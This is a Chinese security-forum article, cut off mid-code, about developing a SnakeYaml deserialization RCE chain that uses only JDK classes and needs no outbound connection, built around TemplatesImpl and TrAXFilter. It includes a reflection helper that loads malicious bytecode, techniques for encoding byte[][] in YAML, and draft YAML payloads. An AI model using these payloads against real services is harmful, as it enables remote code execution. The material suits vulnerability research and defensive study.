---
title: SnakeYaml 不出网 RCE 新链（JDK原生链）挖掘
url: https://forum.butian.net/share/4486
source: 奇安信攻防社区
date: 2025-07-30
fetch_date: 2025-10-06T23:16:24.245986
---

# SnakeYaml 不出网 RCE 新链（JDK原生链）挖掘

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### SnakeYaml 不出网 RCE 新链（JDK原生链）挖掘

* [漏洞分析](https://forum.butian.net/topic/48)

其他所有链, 要么需要一些依赖, 要么需要出网 (打 JNDI), 难道 SnakeYaml 在原生的 JDK 下无法不出网 RCE 了么？答案非也.

SnakeYaml 不出网 RCE 新链（JDK原生链）挖掘
==============================
前言
--
在 <https://forum.butian.net/share/4467> 中, 我们介绍了许许多多的链子, 都是围绕 SnakeYaml 进行展开的, 但是有且仅有一条链是无需其他依赖, 也就是`MarshalOutputStream`配合`ScriptEngineManager`来写入本地文件后通过 SPI 机制来进行本地 RCE 并且是不需要出网的, 但它的利用版本局限于 JDK &gt; 11.
其他所有链, 要么需要一些依赖, 要么需要出网 (打 JNDI), 难道 SnakeYaml 在原生的 JDK 下无法不出网 RCE 了么？答案非也.
挖掘过程
----
### SnakeYaml 机制简单回顾
在《从 SnakeYaml 看 ClassPathXmlApplicationContext 不出网利用》中, 我们总结了`与 FastJson 不同点`, 该表格来源于 P 牛总结, 其表格如下所示:
| | Fastjson | SnakeYAML |
|---|---|---|
| setter | ✅ | ✅ |
| getter | ✅ | ❌ |
| constructor | ⭕（有条件） | ✅ |
其中所有的 SnakeYaml 链子要么围绕构造器, 要么利用 setter, 要么运用 SnakeYaml 的 HashMap 机制反序列化回来时调用恶意对象的 hashCode 方法进行 RCE. 那么在这个游戏规则之上, 我们如何挖掘一条新链子来进行不出网 RCE 呢？
### 反序列化老朋友 - TemplatesImpl
TemplatesImpl 相信大家都很熟悉, 我们经常利用它进行反序列化 RCE 操作, 原因则是它在反序列化中有一条这样的链子:
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-e5041696be50d07986d07a5af61c7f98dca0a4ad.png)
这张图总结于我发表的《JAVA安全 | Classloader：理解与利用一篇就够了》: [https://mp.weixin.qq.com/s/MFeQJeSdnktnNXL\\_6\\_PH-w](https://mp.weixin.qq.com/s/MFeQJeSdnktnNXL\_6\_PH-w)
但实际上这条链子的核心点在于`\_name, \_bytecodes`等核心变量不为 null 的情况下让其走通走到`ClassLoader::defineClass`方法来完成类加载从而达到代码执行的目的, 也以至于我们在编写反序列化时经常会写出如下 DEMO 将其放到某条链子尾端来进行利用:
```java
public static TemplatesImpl getTemplatesImpl() throws Exception {
TemplatesImpl templates = new TemplatesImpl();
Field bytecodes = templates.getClass().getDeclaredField("\_bytecodes"); // 最终调用到 defineClass 方法中加载类字节码
Field name = templates.getClass().getDeclaredField("\_name"); // 放置任意值
Field tfactory = templates.getClass().getDeclaredField("\_tfactory");
name.setAccessible(true);
bytecodes.setAccessible(true);
tfactory.setAccessible(true);
byte[][] myBytes = new byte[1][];
myBytes[0] = Repository.lookupClass(Evil.class).getBytes(); // 这个恶意类必须继承`com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`抽象类, 之前有分析过, 就不提及了.
bytecodes.set(templates, myBytes);
name.set(templates, "");
tfactory.set(templates, new TransformerFactoryImpl());
return templates;
}
```
而我们知道 TemplatesImpl 实际上没有提供 setter 方法, 若想在当前场景利用它则需要观察它的构造器是否可以对这些关键变量赋值:
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-7ead799856c17fb24a455890fe3c809d90c14630.png)
好巧不巧, TemplatesImpl 它的构造器的初始化变量刚好是我们所需要的三个核心变量. 所以我们"完全"可以利用它的构造器机制来生成一个`恶意的TemplatesImpl实例`.
### CC 链回顾 - TrAXFilter
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-bfde1ed1cb6bea36921edae6832897bfaae9c898.png)
在这张 CC 链总结图中, 我们可以看到 TemplatesImpl 的前置 TrAXFilter, 它的构造器有调用到`TemplatesImpl::newTransformer`方法, 如图:
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-c70818fe2ac6afa9fc2fe8d1d76adca33f2581eb.png)
很清晰的就可以看到, 在 TrAXFilter 的构造器中调用了恶意 TemplatesImpl 的 newTransformer 方法, 其利用点也是在构造器.
既然 TemplatesImpl 的恶意属性可以在构造器中进行构造, 而 TrAXFilter 的构造器又是传递 TemplatesImpl, 那么这种情况下 SnakeYaml 不就刚好可以进行本地命令执行了吗？想象是美好的, 可现实总是磕磕绊绊.
### 在 SnakeYaml 下构造 byte\[\]\[\]
有了上述思想过后, 我们可以开始试着编写一个 Payload 了, 但需注意的是我们需要构造一个 byte\[\]\[\] 类型的数据, 因为这是 TemplatesImpl 构造器接收字节码必须传递的类型.
那么我们应该如何在 SnakeYaml 下表示一个 byte\[\]\[\] 类型的数据呢？在《从 SnakeYaml 看 ClassPathXmlApplicationContext 不出网利用》中, 我们对`MarshalOutputStream`复现时, 构造过 byte\[\] 类型的数据, 其构造方法来源于官方文档:
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-2e1c67d6ed192c979d45a08bb53c058a4b3347a2.png)
但注意官方提供的 !!binary 只能获取 byte\[\], 而不是 byte\[\]\[\], 并且在官方文档中并没有找到对于 byte\[\]\[\] 类型数据构建的说明. 那么这样就没办法了吗？
#### 对于 byte\[\]\[\] 构造的探索
这里我打算从`序列化`入手, 让其输出出来观察其数据类型, 准备如下 JavaBean:
```java
package com.heihu577.bean;
public class TestByte {
private byte[][] bytes = new byte[1][];
public TestByte() {
bytes[0] = "Hello".getBytes();
}
private TestByte(byte[][] bytes) {
this.bytes = bytes;
}
public byte[][] getBytes() {
return bytes;
}
public void setBytes(byte[][] bytes) {
this.bytes = bytes;
}
}
```
并且以序列化的方式进行输出:
```java
@Test
public void dumpYmlTester() {
Yaml yaml = new Yaml();
String dump = yaml.dump(new TestByte());
System.out.println(dump);
/\*
!!com.heihu577.bean.TestByte
bytes:
- !!binary |-
SGVsbG8=
\*/
}
```
对于 byte\[\]\[\] 格式的数据我们已经通过序列化的方式得到了, 但是又出现一个问题, 就是在 SnakeYaml 中, 我们未来需要将`byte[][]`传入`TemplatesImpl`构造器的第一个参数, 并且以`!!类名 [!!参数1类型 参数1值, !!参数2类型 参数2值]`一行进行传入, 但我们目前只有多行表示的`byte[][]`, 这种情况我们应该怎么办呢？
而我们知道, Yaml 单行和多行本身就有不同的表达形式, 我们只需要知道该形式换回一行如何表示就行了, 这里我经过多次尝试, 该表达形式本质上只是`[!!binary 内容]`的多行变形, 可以通过如下脚本证明, 首先修改我们的 JavaBean, 增加一个 equals 方法:
```java
package com.heihu577.bean;
import java.util.Arrays;
import java.util.Objects;
public class TestByte {
private byte[][] bytes = new byte[1][];
public TestByte() {
bytes[0] = "Hello".getBytes();
}
private TestByte(byte[][] bytes) {
this.bytes = bytes;
}
public byte[][] getBytes() {
return bytes;
}
public void setBytes(byte[][] bytes) {
this.bytes = bytes;
}
@Override
public boolean equals(Object o) {
if (this == o) return true;
if (o == null || getClass() != o.getClass()) return false;
TestByte testByte = (TestByte) o;
return Objects.deepEquals(bytes, testByte.bytes);
}
@Override
public int hashCode() {
return Arrays.deepHashCode(bytes);
}
}
```
将对象与对象之间的比较通过 bytes 成员属性来决定, 随后使用 SnakeYaml 进行反序列化并主动调用 equals 方法进行比较:
```java
@Test
public void dumpYmlTester() {
String yml1 = " !!com.heihu577.bean.TestByte\n" +
" bytes:\n" +
" - !!binary |-\n" +
" SGVsbG8=";
String yml2 = "!!com.heihu577.bean.TestByte [[!!binary SGVsbG8=]]";
Yaml yaml = new Yaml();
Object load1 = yaml.load(yml1);
Object load2 = yaml.load(yml2);
System.out.println(load1.equals(load2)); // true
}
```
#### 失败的 TemplatesImpl 实例创建
有了上述巩固的知识体系后, 我们可以编写出如下 Payload, 用来生成 TemplatesImpl:
```php
!!com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl [
[!!binary SGVsbG8=],
"heihu577",
!!java.util.Properties {},
!!int 0,
!!com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl {}
]
```
现实会给我当头一棒, 直接爆出异常并告诉我不存在构造器:
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-3082a7dd6d594dc32c7ef2417e69726ae80cec5c.png)
嗯？TemplatesImpl 明明存在五个参数的构造器, 现在居然告诉我不存在...
#### SnakeYaml 创建实例源码分析 &amp; TemplatesImpl 实例化失败的原因
在这里我不得不亲自点开 SnakeYaml 底层源码看看了, 在`org.yaml.snakeyaml.constructor.Constructor$ConstructSequence`成员内部类中的`construct`方法中存在实例的创建逻辑, 我们看一下具体创建的过程:
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-aecc5b34fbb580e2275af64ea3d8454794149cb7.png)
可能这样描述比较复杂, 这里我将准备一个案例来理解这个过程到底是什么意思, 定义 JavaBean:
```java
package com.heihu577.bean;
public class TestByte {
private byte[][] bytes = new byte[1][];
private TestByte(String name, byte[][] bytes) {
this.bytes = bytes;
}
private TestByte(byte[][] bytes, String name) {
this.bytes = bytes;
}
}
```
注意该构造器存在两个构造器, 它们的参数分别是两个, 而使用如下 Payload 是无法成功的:
```java
String yml2 = "!!com.heihu577.bean.TestByte [[!!binary SGVsbG8=], \"heihu577\"]";
Yaml yaml = new Yaml();
Object load2 = yaml.load(yml2);
System.out.println(load2);
```
会抛出如下异常:
![图片.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/07/attach-852e50799f5137a31ab711b5633668d42e878bbc.png)
但当我们将第一个有参构造器注释掉, 让该类只留下一个存在两个参数的构造器:
```java
package com.heihu577.bean;
public class TestByte {
private byte[][] bytes = new byte[1][];
// private TestByte(String name, byte[][] bytes) {
// this.bytes = bytes;
// }
private TestByte(byt...